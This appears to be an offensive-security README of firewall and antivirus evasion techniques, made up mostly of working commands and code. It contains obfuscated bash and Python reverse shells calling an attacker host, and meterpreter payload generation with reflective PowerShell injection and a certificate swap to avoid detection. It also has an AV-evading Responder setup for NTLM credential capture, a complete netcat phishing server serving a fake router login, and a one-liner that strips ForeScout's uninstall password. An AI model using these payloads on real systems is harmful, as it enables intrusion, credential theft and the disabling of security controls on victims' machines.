# evasion
Techniques for evading firewalls and malware detection.

Acronyms used:
* UTM - Unified Threat Management.  A class of nextgen firewalls with integrated security features.
* IDS - Intrusion Detection System.  A device that detects malicious network traffic.
* IPS - Intrusion Prevention System.  A device that detects and blocks malicious network traffic.
* A/V - Anti-Virus, Anti-Malware, etc.

## ROT13 encoded reverse shell using bash TCP device

This technique is useful for getting a Linux reverse shell through a UTM firewall, IDS or IPS.

In this example the attacking host is on IP address 10.1.2.3 and listens on port 4444 for the reverse shell from the victim.

( attacker )<br />

[ linux command ]<br />
`IFS=''; (while read -r lin; do echo $lin | tr 'A-Za-z' 'N-ZA-Mn-za-m'; done) | nc -nlvp 4444 | tr 'A-Za-z' 'N-ZA-Mn-za-m'`<br />

( victim )<br />

[ linux command ]<br />
`exec 5<>/dev/tcp/10.1.2.3/4444; /bin/bash 2>&1 <(while read -r lin; do echo $(echo $lin | stdbuf -i0 -o0 -e0 tr 'A-Za-z' 'N-ZA-Mn-za-m'); done <&5) | stdbuf -i0 -o0 -e0 tr 'A-Za-z' 'N-ZA-Mn-za-m' >&5; exec 5<&-`<br />

## XOR obfuscated reverse shell using python

This technique is useful for getting a reverse shell through a UTM firewall, IDS or IPS on a system supporting Python.

In this example the attacking host is on IP address 10.1.2.3 and listens on port 4444 for the reverse shell from the victim.

( attacker )<br />

[ python script ]<br />
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4444))
s.listen(2)
print "Listening... "
(client, (ip, port)) = s.accept()
print " Received connection from : ", ip
while True:
  command = raw_input('~$ ')
  encode = bytearray(command)
  for i in range(len(encode)):
    encode[i] ^=0x5A
  client.send(encode)
  en_data=client.recv(2048)
  decode = bytearray(en_data)
  for i in range(len(decode)):
    decode[i] ^=0x5A
  print decode
client.close()
s.close()
```

( victim )<br />

[ python script ]<br />
```python
import socket,subprocess,sys
RHOST = "10.1.2.3"
RPORT = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
while True:
  data = s.recv(1024)
  en_data = bytearray(data)
  for i in range(len(en_data)):
    en_data[i] ^=0x5A
  comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  STDOUT, STDERR = comm.communicate()
  en_STDOUT = bytearray(STDOUT)
  for i in range(len(en_STDOUT)):
    en_STDOUT[i] ^=0x5A
  s.send(en_STDOUT)
s.close()
```

## Circumventing A/V on Windows to get meterpreter reverse shell

This technique is useful for getting a reverse shell on Windows where endpoint A/V protection is in place that blocks malicious DLLs and blocks malicious network connections such as the default meterpreter reverse_https SSL server certificate.

In this example the attacking host is Kali on IP address 10.1.2.3 and listens on port 443 for the reverse shell from the victim.  Powershell reflection will be used on the Windows victim to execute the meterpreter DLL.  The receiving Kali host will use metasploit multi-handler with a custom SSL certificate to accept the reverse HTTPS connection.

( attacker )<br />

First create your custom SSL certificate and private key.  The properties (e.g. Subject) used by the default certificate for reverse_https in metasploit that are sent during the SERVER HELLO phase may trigger host-based IDS/IPS so you will need to replace it with a certificate that has different Subject attributes.  Execute the following two commands to generate a replacement certificate.  This example assumes the output file msf.pem will be place into root's home folder.

`openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -subj "/C=US/ST=NY/L=Ithaca/O=Insanity/CN=pwned.you.org" -keyout msf.key -out msf.crt`<br />
`cat msf.key msf.crt > msf.pem`<br />

Generate the meterpreter DLL as a base64 blob that you will paste into the powershell script which will be executed on the Windows victim.

[ 32-bit meterpreter payload ]<br />
`msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=10.1.2.3 LPORT=443 -f dll | base64 -w 0`<br />
[ 64-bit meterpreter payload ]<br />
`msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=10.1.2.3 LPORT=443 -f dll | base64 -w 0`<br />

Create a powershell script called msf.ps1 that will be executed on the victim.  The powershell script will incorporate code developed by PowerShell Mafia to handle the reflective DLL injection.  The URL for the reflection code is here:

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

The msf.ps1 script should be constructed as follows:

`$b64_meterpreter_dll = '<paste base64 for DLL here>'`<br />
`$bytes = [Convert]::FromBase64String($b64_meterpreter_dll)`<br />
`<paste PowerShell Mafia code here>`<br />
`Invoke-ReflectivePEInjection -PEBytes $bytes -Verbose`<br />

Launch metasploit and start the multi-handler listener to receive the meterpreter reverse HTTPS payload.  Be sure to use the appropriate architecture (x86 or x64):

`msfconsole -q`<br />
`use exploit/multi/handler`<br />
`set payload windows/x64/meterpreter/reverse_https`<br />
`set lhost 10.1.2.3`<br />
`set lport 443`<br />
`set HandlerSSLCert /root/msf.pem`<br />
`set StagerVerifySSLCert false`<br />
`run`<br />

( victim )<br />

Deliver the msf.ps1 script to the Windows victim and execute it.

## >> Modifying Responder.py to evade AV detection

If Windows AV (e.g. Symantec Endpoint Protection - SEP) is interfering with HTTP NTLM credential grabbing attacks using `Responder.py`, try this.  Tested with Responder version 3.0.2.0.

**Clone and edit Responder**

```
mkdir ~/scripts
cd ~/scripts
git clone https://github.com/lgandx/Responder
cd Responder
```

Edit `Responder.conf` to serve a 1x1 pixel png file.

```
under "; Servers to start"
    set all to Off except HTTP
under "; Specific NBT-NS/LLMNR names to respond to"
    set RespondToName = DONOTRESPOND
under "; HTML answer to inject in HTTP responses"
    set HTMLToInject = <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAABhGlDQ1BJQ0MgcHJvZmlsZQAAKJF9kT1Iw0AYht+mloq0ONhBxCFDdbIgKuKoVShChVArtOpgcukfNGlIUlwcBdeCgz+LVQcXZ10dXAVB8AfEydFJ0UVK/C4ptIjxjuMe3vvel7vvAKFZZZrVMw5oum1mUkkxl18Vw6+I0AwhiqjMLGNOktLwHV/3CPD9LsGz/Ov+HFG1YDEgIBLPMsO0iTeIpzdtg/M+cYyVZZX4nHjMpAsSP3Jd8fiNc8llgWfGzGxmnjhGLJa6WOliVjY14iniuKrplC/kPFY5b3HWqnXWvid/YaSgryxzndYwUljEEiSIUFBHBVXYSNCuk2IhQ+dJH/+Q65fIpZCrAkaOBdSgQXb94H/wu7dWcXLCS4okgdCL43yMAOFdoNVwnO9jx2mdAMFn4Erv+GtNYOaT9EZHix8B/dvAxXVHU/aAyx1g8MmQTdmVgrSEYhF4P6NvygMDt0Dfmte39jlOH4As9Sp9AxwcAqMlyl73eXdvd9/+rWn37wfzwXJ0GXT1kgAAAAlwSFlzAAAuIwAALiMBeKU/dgAAAAxJREFUCNdjOHbsGAAEqAJTHAqdsQAAAABJRU5ErkJggg==">
```

Edit `packets.py` and change every instance of `Microsoft-IIS/7.5` to `Apache/2.2.15`.<br />
If using `vi` search and replace `:%s/Microsoft-IIS\/7.5/Apache\/2.2.15/g`

Clear the cache and logs<br />
```
rm Responder.db
rm logs/*
```

Launch Responder.<br />
`python2 ./Responder.py -I wlan0`

Lure the victim to request the URL, where www.my.lab is the attacking host running Responder.<br />
(e.g.) `http://www.my.lab/images/image.png`

## >> Capturing Credentials with Fake Login Pages

This example shows how to setup a lightweight web server using bash and netcat to phish a user name and password from a network administrator.  In this example a fake login page is served to a user; once the credentials are captured the user is redirected to a real device.  This technique can be modified to suit a variety of scenarios.  

**Create a directory for the script and files**

```
mkdir -p /root/scripts/web_creds
cd /root/scripts/web_creds
```

**Create the HTML for the fake login page**

The page used in this example can be found [here](https://github.com/billchaison/evasion/blob/master/cisco.html.zip)<br />
The uncompressed file will be saved to `/root/scripts/web_creds/cisco.html` in this example.

**Create the web server script**

The script will be `/root/scripts/web_creds/web_creds.sh`

```bash
#!/usr/bin/bash

# harvest credentials using a fake login page followed by
# redirect to legitimate site.  for example, lure a victim
# to log onto a fake router admin page then redirect to a
# real device.

# minimal web server using bash and netcat.
# change variables to suit your environment.

# the adapter IP address nc will bind to
NC_BIND_ADDR=192.168.1.242
# the TCP port nc will listen on
NC_BIND_PORT=80
# the resource path the victim will be lured to
RESOURCE_GET=/admin/logon
# the 302 redirect to a real device login page
REDIRECT_URL=http://192.168.1.1/Main_Login.asp
# the GET form action used in WEBCRED_FILE when credentials are supplied
# (using GET instead of POST because of absence of line buffered POST data)
WEBCRED_GET=/session/logon_51aa0e6a
# local HTML file containing fake authentication portal
WEBCRED_FILE=/root/scripts/web_creds/cisco.html

MY_HOST_FQDN=$(hostname -f)
WEBCRED_SIZE=$(stat -c %s $WEBCRED_FILE | tr -d [\r\n])

echo -e "Lure victim to:\nhttp://$NC_BIND_ADDR:$NC_BIND_PORT$RESOURCE_GET\nhttp://$MY_HOST_FQDN:$NC_BIND_PORT$RESOURCE_GET\n"

function urldecode {
   echo $@ | sed "s@+@ @g;s@%@\\\\x@g" | xargs -0 printf "%b"
}

while true
do
   mkfifo webcreds_wr >/dev/null 2>&1
   mkfifo webcreds_rd >/dev/null 2>&1
   FLAG=0
   nc -nl -s $NC_BIND_ADDR -p $NC_BIND_PORT >webcreds_rd < <(cat webcreds_wr) 2>/dev/null &
   NCPID=$!
   while read line <webcreds_rd
   do
      if [ $FLAG -eq 0 ]
      then
         FLAG=1
         (sleep 5; if [ -d "/proc/$NCPID" ]; then kill $NCPID; rm -f webcreds_rd; mkfifo webcreds_rd >/dev/null 2>&1; fi)&
      fi
      if echo "$line" | grep $RESOURCE_GET | grep -vi Referer >/dev/null 2>&1
      then
         HTTP_RESP_1="HTTP/1.1 200 OK"
         HTTP_RESP_2="Server: Apache/2.4"
         HTTP_RESP_3="Date: $(date -u | sed 's/AM \|PM //' | sed 's/UTC/GMT/' | sed 's/ /, /')"
         HTTP_RESP_4="Content-Length: $WEBCRED_SIZE"
         HTTP_RESP_5="Connection: close"
         HTTP_RESP_6="Content-Type: text/html"
         HTTP_RESP_7=$(cat $WEBCRED_FILE)
         printf "%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n\r\n%s" "$HTTP_RESP_1" "$HTTP_RESP_2" "$HTTP_RESP_3" "$HTTP_RESP_4" "$HTTP_RESP_5" "$HTTP_RESP_6" "$HTTP_RESP_7" >webcreds_wr
         sleep 1
         kill $NCPID >/dev/null 2>&1
         break
      fi
      if echo "$line" | grep $WEBCRED_GET >/dev/null 2>&1
      then
         date
         echo $line
         echo -n "[decoded] "
         urldecode "$line"
         echo ============================================================
         HTTP_RESP_1="HTTP/1.1 302 Found"
         HTTP_RESP_2="Location: $REDIRECT_URL"
         printf "%s\r\n%s\r\n\r\n" "$HTTP_RESP_1" "$HTTP_RESP_2" > webcreds_wr
         sleep 1
         kill $NCPID >/dev/null 2>&1
         break
      fi
   done
done
```

**Launching the attack**

Run the script `./web_creds.sh` you will see the following output.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/wc01.png)

Once the user accesses `http://192.168.1.242:80/admin/logon` the following page will be returned.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/wc02.png)

The user provides credentials into the form fields then clicks on the Login button.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/wc03.png)

The user is redirected to a real device's login page.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/wc04.png)

The script prints the captured credentials then waits for other login attempts.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/wc05.png)

## >> Uninstalling ForeScout Secure Connector (Password Bypass)

On Windows, the ForeScout Secure Connector may be protected from removal with a password specified under `C:\Program Files\ForeScout SecureConnector\SecureConnectorPassword.ini`.  Launch an elevated Powershell with administrative privileges and execute the following one-liner to delete the password file and uninstall the product.

```powershell
Stop-Process -Name "SecureConnector" -Force; while($true) { try { Remove-Item 'C:\Program Files\ForeScout SecureConnector\SecureConnectorPassword.ini' -ErrorAction 'stop'; break; } catch { } }; Start-Process c:\Windows\System32\rundll32.exe 'shell32.dll,ShellExec_RunDLL "C:\Program Files\ForeScout SecureConnector\SecureConnector.exe" -uninstall'
```

